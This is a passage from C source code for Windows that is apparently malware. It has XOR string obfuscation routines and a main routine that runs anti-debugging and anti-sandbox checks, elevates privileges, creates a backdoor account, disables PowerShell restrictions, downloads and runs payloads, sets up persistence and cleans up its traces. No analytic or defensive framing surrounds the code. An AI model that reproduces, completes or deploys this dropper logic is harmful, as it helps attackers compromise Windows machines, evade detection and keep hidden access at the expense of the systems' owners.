        CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 15000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

OBF_STR ObfuscateString(const char* input, DWORD key) {
    OBF_STR result = {0};
    if (!input) return result;

    size_t len = strlen(input) + 1;
    result.data = (BYTE*)malloc(len);
    if (!result.data) return result;

    result.key = key;
    result.len = len;
    DWORD currentKey = key;

    for (size_t i = 0; i < len; i++) {
        result.data[i] = input[i] ^ (currentKey & 0xFF);
        currentKey = (currentKey >> 8) | (currentKey << 24);
    }

    return result;
}

char* Deobfuscate(const OBF_STR* obf) {
    if (!obf || !obf->data || obf->len == 0) return NULL;

    char* result = (char*)malloc(obf->len);
    if (!result) return NULL;

    DWORD currentKey = obf->key;
    for (size_t i = 0; i < obf->len; i++) {
        result[i] = obf->data[i] ^ (currentKey & 0xFF);
        currentKey = (currentKey >> 8) | (currentKey << 24);
    }

    return result;
}

void SecureFree(void* ptr, size_t size) {
    if (ptr) {
        SecureZeroMemory(ptr, size);
        free(ptr);
    }
}

// Main entry point
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    AntiDebug();
    AntiSandbox();
    RandomSleep(5000, 2000);
    
    if(!IsAdmin()) {
        if (!ElevatePrivileges()) {
            return 0;
        }
        return 0;
    }
    
    my_srand(GetTickCount());
    
    int stages = 0;
    
    for (int attempt = 0; attempt < MAX_ATTEMPTS; attempt++) {
        if (!(stages & 1)) {
            CreateBackdoorAccount();
            stages |= 1;
        }
        
        if (!(stages & 2)) {
            DisablePowerShellRestrictions();
            stages |= 2;
        }
        
        if (!(stages & 4)) {
            DownloadAndExecutePayloads();
            stages |= 4;
        }
        
        if (!(stages & 8)) {
            EstablishPersistence();
            stages |= 8;
        }
        
        if (stages == 0xF) break;
        RandomSleep(5000, 3000);
    }
    
    RandomSleep(PAYLOAD_DELAY, 15000);
    CleanupTemporaryResources();
    
    return 0;
}